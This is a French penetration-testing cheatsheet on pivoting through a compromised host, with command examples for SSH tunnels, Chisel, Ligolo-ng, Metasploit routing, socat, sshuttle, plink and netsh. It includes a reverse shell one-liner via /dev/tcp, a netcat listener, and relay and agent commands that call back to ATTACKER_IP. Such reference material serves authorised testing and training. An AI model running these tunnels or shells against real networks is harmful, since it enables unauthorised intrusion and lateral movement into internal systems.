---
tags:
  - cheatsheet
---

# Pivoting — Technique

> Utiliser une machine compromise comme relais pour atteindre des réseaux normalement inaccessibles depuis l'extérieur.

---

## Présentation

Le **pivoting** consiste à utiliser une machine compromise comme relais pour atteindre des réseaux normalement inaccessibles.

```
[Attacker] → [Machine Compromise] → [Réseau Interne]
   Kali         Pivot (DMZ)          192.168.1.0/24
```

### Types de tunneling

```
Local Port Forward    → Accéder à un port distant via tunnel local
Remote Port Forward   → Exposer un port local vers l'extérieur
Dynamic Port Forward  → Proxy SOCKS (toutes destinations)
VPN Tunneling         → Tunnel niveau réseau complet
```

## Détection / Identification

Sur une machine fraîchement compromise, vérifier si elle peut servir de pivot :

```bash
# Linux — interfaces réseau, routes, ARP
ip a
ip route
arp -a
cat /etc/resolv.conf                 # DNS interne = indice de domaine AD
cat /etc/hosts

# Windows — équivalents
ipconfig /all
route print
arp -a
```

**Indices d'un hôte pivot exploitable :**
- Plusieurs interfaces réseau / plusieurs sous-réseaux dans la table de routage (machine dual/multi-homed)
- Table ARP contenant des IP hors du sous-réseau déjà connu
- Résolveur DNS interne, suffixe de domaine AD
- Règles de pare-feu locales permissives entre segments (`iptables -L`, `netsh advfirewall firewall show rule name=all`)

## Exploitation

### SSH Tunneling

**Local Port Forwarding** — accéder à un service distant via la machine pivot.
```bash
# Syntaxe: ssh -L [local_port]:[target_host]:[target_port] user@pivot

# Exemple: Accéder à un serveur web interne (192.168.1.10:80) via pivot
ssh -L 8080:192.168.1.10:80 user@pivot.com

# Puis accéder localement
curl http://127.0.0.1:8080

# Accéder à une base de données interne
ssh -L 3306:db.internal:3306 user@pivot.com
mysql -h 127.0.0.1 -P 3306 -u dbuser -p

# Multiple forwards
ssh -L 8080:web.internal:80 -L 3306:db.internal:3306 user@pivot.com
```

**Remote Port Forwarding** — exposer un service de l'attaquant vers le réseau interne.
```bash
# Syntaxe: ssh -R [remote_port]:[local_host]:[local_port] user@pivot

# Exemple: Exposer un serveur web local sur le pivot
ssh -R 8080:127.0.0.1:80 user@pivot.com
# Le port 8080 du pivot pointe vers le port 80 de l'attaquant

# Reverse shell callback
# Sur l'attaquant
nc -lvnp 4444

# Créer le tunnel
ssh -R 4444:127.0.0.1:4444 user@pivot.com

# Depuis le réseau interne, se connecter à pivot:4444
# → Redirigé vers attacker:4444
```

**Dynamic Port Forwarding (SOCKS Proxy)** — créer un proxy SOCKS pour accéder à tout le réseau.
```bash
# Créer le proxy SOCKS
ssh -D 1080 user@pivot.com

# Utiliser avec proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains curl http://192.168.1.10/

# Ou configurer dans le navigateur
# Proxy SOCKS5: 127.0.0.1:1080

# Utiliser avec curl directement (SOCKS natif)
curl --socks5 127.0.0.1:1080 http://192.168.1.10/
```
> Scan dédié à travers ce proxy : voir `nmap.md`, section "Scan à travers un pivot".

**Options utiles :**
```bash
# En arrière-plan
ssh -f -N -D 1080 user@pivot.com

# Avec compression
ssh -C -D 1080 user@pivot.com

# Keepalive
ssh -o ServerAliveInterval=60 -D 1080 user@pivot.com

# Ignorer la vérification de clé (lab uniquement!)
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@pivot.com

# Combinaison complète
ssh -f -N -C -D 1080 -o ServerAliveInterval=60 user@pivot.com
```

### Chisel

**Installation**
```bash
# Télécharger les binaires : https://github.com/jpillora/chisel/releases

# Linux
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_*.gz && chmod +x chisel

# Windows : chisel_windows_amd64.exe
```

**Serveur (Attaquant)**
```bash
./chisel server -p 8000 --reverse
./chisel server -p 8000 --reverse --auth user:password   # avec authentification
```

**Client (Pivot)**
```bash
# Reverse SOCKS proxy
./chisel client ATTACKER_IP:8000 R:socks

# Reverse port forward
./chisel client ATTACKER_IP:8000 R:8080:192.168.1.10:80

# Multiple tunnels
./chisel client ATTACKER_IP:8000 R:socks R:3306:db.internal:3306
```

**Utilisation**
```bash
# Le proxy SOCKS est sur 127.0.0.1:1080 (par défaut) sur le serveur
proxychains curl http://192.168.1.10/

# Ou spécifier le port
./chisel server -p 8000 --reverse --socks5
./chisel client ATTACKER_IP:8000 R:9050:socks
# SOCKS sur 127.0.0.1:9050
```
> Scan dédié à travers ce proxy : voir `nmap.md`, section "Scan à travers un pivot".

### Ligolo-ng

**Installation**
```bash
# Télécharger proxy (attaquant) et agent (pivot) : https://github.com/nicocha30/ligolo-ng/releases

# Attaquant
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz

# Pivot
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz
```

**Configuration (Attaquant)**
```bash
# Créer l'interface TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Démarrer le proxy
./proxy -selfcert

# Ajouter une route vers le réseau interne (après connexion de l'agent)
sudo ip route add 192.168.1.0/24 dev ligolo
```

**Agent (Pivot)**
```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Windows
agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

**Interface Ligolo**
```bash
# Dans le proxy
ligolo-ng » session
# Sélectionner la session

ligolo-ng » start
# Le tunnel est actif

# Maintenant, accéder directement au réseau interne
ssh user@192.168.1.10
```
> Scan dédié à travers ce tunnel (sans proxychains, tous types de scan) : voir `nmap.md`, section "Scan à travers un pivot".

### Metasploit Pivoting

**Ajouter une route**
```bash
# Après avoir obtenu une session meterpreter
meterpreter > run autoroute -s 192.168.1.0/24

# Ou manuellement
msf > route add 192.168.1.0 255.255.255.0 1  # 1 = session ID
msf > route print
```

**SOCKS Proxy**
```bash
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 1080
msf > set VERSION 5
msf > run -j
```
> Scan dédié à travers ce proxy : voir `nmap.md`, section "Scan à travers un pivot".

**Port Forward**
```bash
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.10
# Accéder à 127.0.0.1:8080 → 192.168.1.10:80

meterpreter > portfwd list
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.10
```

### Socat

**Port Forwarding basique**
```bash
# Sur le pivot
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80

# Connexion de l'attaquant
curl http://pivot:8080  # → 192.168.1.10:80
```

**Reverse Shell via Pivot**
```bash
# Attaquant
nc -lvnp 4444

# Pivot (relayer vers attaquant)
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444

# Cible (reverse shell vers pivot)
bash -c 'bash -i >& /dev/tcp/PIVOT_IP/4444 0>&1'
```

**Tunneling avancé (SSL)**
```bash
# Serveur
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:22

# Client
socat TCP-LISTEN:2222,fork OPENSSL:server:443
ssh -p 2222 localhost
```

### SSHuttle

```bash
pip install sshuttle
# ou
apt install sshuttle
```

```bash
# Tunnel tout le trafic vers un sous-réseau
sshuttle -r user@pivot.com 192.168.1.0/24

# Multiple réseaux
sshuttle -r user@pivot.com 192.168.1.0/24 10.0.0.0/8

# Tout le trafic (VPN-like)
sshuttle -r user@pivot.com 0.0.0.0/0

# Exclure certaines IPs
sshuttle -r user@pivot.com 192.168.1.0/24 -x 192.168.1.1

# DNS via tunnel
sshuttle --dns -r user@pivot.com 192.168.1.0/24
```

**Avantages** : pas besoin de proxy ou de proxychains, TCP transparent, support DNS, simple à utiliser.

### Plink (Windows)

```powershell
# Depuis PuTTY : https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

# Dynamic forward (SOCKS)
plink.exe -D 1080 user@pivot.com

# Local forward
plink.exe -L 8080:192.168.1.10:80 user@pivot.com

# Remote forward
plink.exe -R 4444:127.0.0.1:4444 user@pivot.com

# Non-interactif (avec mot de passe)
echo y | plink.exe -ssh -l user -pw password -D 1080 pivot.com
```

### Netsh (Windows natif)

```powershell
# Ajouter un forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.10

# Lister les forwards
netsh interface portproxy show all

# Supprimer
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
netsh interface portproxy reset          # Supprimer tout

# Firewall — autoriser le port
netsh advfirewall firewall add rule name="Pivot 8080" dir=in action=allow protocol=tcp localport=8080
```

### Double Pivoting

**Scénario**
```
[Attacker] → [Pivot1 (DMZ)] → [Pivot2 (Internal)] → [Target (Secured)]
   Kali         10.0.0.5          192.168.1.10         172.16.0.5
```

**Avec SSH**
```bash
# Premier tunnel (Attacker → Pivot1)
ssh -D 1080 user@pivot1.com

# Depuis Pivot1, tunnel vers Pivot2
ssh -D 1081 -o ProxyCommand="nc -x 127.0.0.1:1080 %h %p" user@192.168.1.10

# Ou tunnel direct à travers Pivot1
ssh -J user@pivot1.com user@pivot2.internal
```

**Avec Chisel**
```bash
# Attaquant: serveur
./chisel server -p 8000 --reverse

# Pivot1: client + serveur
./chisel client ATTACKER:8000 R:1080:socks
./chisel server -p 9000 --reverse --socks5

# Pivot2: client vers Pivot1
./chisel client PIVOT1:9000 R:1081:socks

# Chaîne de proxys (proxychains.conf)
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081
```

**Avec Metasploit**
```bash
# Session 1: Pivot1
meterpreter > run autoroute -s 192.168.1.0/24

# Exploiter Pivot2 via Session 1
msf > use exploit/...
msf > set RHOSTS 192.168.1.10
msf > exploit

# Session 2: Pivot2
meterpreter > run autoroute -s 172.16.0.0/24
# Maintenant accès à 172.16.0.0/24 via Session 2
```

### Proxychains

**Configuration** (`/etc/proxychains.conf` ou `/etc/proxychains4.conf`)
```bash
# Mode (strict, dynamic, random)
dynamic_chain  # Saute les proxys morts

# Liste de proxys
[ProxyList]
socks5 127.0.0.1 1080
socks4 127.0.0.1 1081
http 127.0.0.1 8080
```

**Utilisation**
```bash
proxychains curl http://192.168.1.10
proxychains msfconsole
proxychains ssh user@192.168.1.10
proxychains firefox
proxychains python3 exploit.py
```
> Scan dédié à travers proxychains : voir `nmap.md`, section "Scan à travers un pivot".

**Limitations** :
```
Pas de UDP (DNS, SNMP)
Pas d'ICMP (ping)
Nmap limité à -sT (connect scan)

Solution DNS : utiliser --dns avec sshuttle, ou un serveur DNS local
```

## Post-exploitation

Une fois le tunnel établi, poursuivre l'énumération et l'exploitation du réseau interne comme si la machine était sur place : scan de ports (voir `nmap.md`), énumération SMB/LDAP/AD, mouvement latéral vers de nouveaux hôtes pivots pour étendre l'accès (double/triple pivoting).

## Vulnérabilités / Misconfigurations classiques

| Faiblesse | Impact |
|---|---|
| Hôte dual/multi-homed sans segmentation stricte | Point de pivot direct vers un réseau plus sensible |
| Pare-feu interne permissif entre segments | Tunneling et pivoting facilités une fois un hôte compromis |
| Pas de monitoring des connexions sortantes inhabituelles | Tunnels SSH/chisel/ligolo non détectés |
| Comptes de service avec accès à plusieurs segments réseau | Pivot applicatif via un compte compromis |

## Outils de référence

| Outil | Usage |
|---|---|
| `ssh` (-L/-R/-D) | Tunneling natif, SOCKS, port forward |
| `chisel` | Tunneling HTTP, contourne les pare-feu sortants stricts |
| `ligolo-ng` | Tunnel niveau réseau (TUN), scans complets sans proxychains |
| `socat` | Relais/port forward générique, y compris SSL |
| `sshuttle` | VPN-like par-dessus SSH, sans proxychains |
| `proxychains` | Router n'importe quel outil à travers un proxy SOCKS/HTTP |
| Metasploit (`autoroute`, `socks_proxy`, `portfwd`) | Pivoting depuis une session meterpreter |
| `plink` / `netsh` | Pivoting depuis un hôte Windows |

## Ressources

- Chisel : https://github.com/jpillora/chisel
- Ligolo-ng : https://github.com/nicocha30/ligolo-ng
- SSHuttle : https://github.com/sshuttle/sshuttle
- HackTricks Pivoting : https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
